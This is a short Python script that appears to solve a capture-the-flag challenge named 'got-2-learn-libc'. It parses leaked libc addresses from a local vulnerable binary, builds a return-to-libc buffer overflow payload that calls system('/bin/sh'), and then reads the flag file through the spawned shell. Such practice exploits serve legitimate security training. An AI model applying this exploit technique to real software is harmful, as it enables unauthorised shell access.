#! /usr/bin/python3

import subprocess

process = subprocess.Popen(["/problems/got-2-learn-libc_0_4c2b153da9980f0b2d12a128ff19dc3f/vuln"],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)

out = process.stdout
out.readline()
out.readline() 
s = out.readline()
puts_address = s[s.find(ord("x"))+1:s.find(ord("x"))+9]
puts_address = int(puts_address,base=16)
print(hex(puts_address))
system_address = puts_address - 149504
print(str(hex(system_address)))

out.readline()
out.readline()
out.readline()
s = out.readline()

bin_sh_address = s[s.find(ord("x"))+1:s.find(ord("x"))+9]
bin_sh_address = int(bin_sh_address,base=16)
print(hex(bin_sh_address))

#print(bytes(bin_sh_address))
#print(bytes("llll",encoding="ascii"))
#print(bytes(system_address))
shellcode=bytes(0)
for i in range(40):
    shellcode +=bin_sh_address.to_bytes(4,byteorder = 'little') 
shellcode += system_address.to_bytes(4,byteorder = 'little')
for i in range(10): 
    shellcode += bin_sh_address.to_bytes(4,byteorder = 'little')
shellcode+=bytes("\n",encoding='ascii')

print(shellcode.hex())

out.readline()
print(str(out.readline()))

process.stdin.write(shellcode)
process.stdin.flush()

print(str(out.readline()))
print(str(out.readline()))

process.stdin.write(bytes("cat /problems/got-2-learn-libc_0_4c2b153da9980f0b2d12a128ff19dc3f/flag.txt \n",encoding="ascii"))
#process.stdin.write(b'cat /problems/got-2-learn-libc_0_4c2b153da9980f0b2d12a128ff19dc3f/flag.txt\n')
#process.stdin.write(b'whoami\n')
process.stdin.write(bytes("whoami\n",encoding="ascii"))
process.stdin.flush()
print(str(out.readline()))
print(str(process.stderr.readline()))
process.wait()
print(process.returncode)
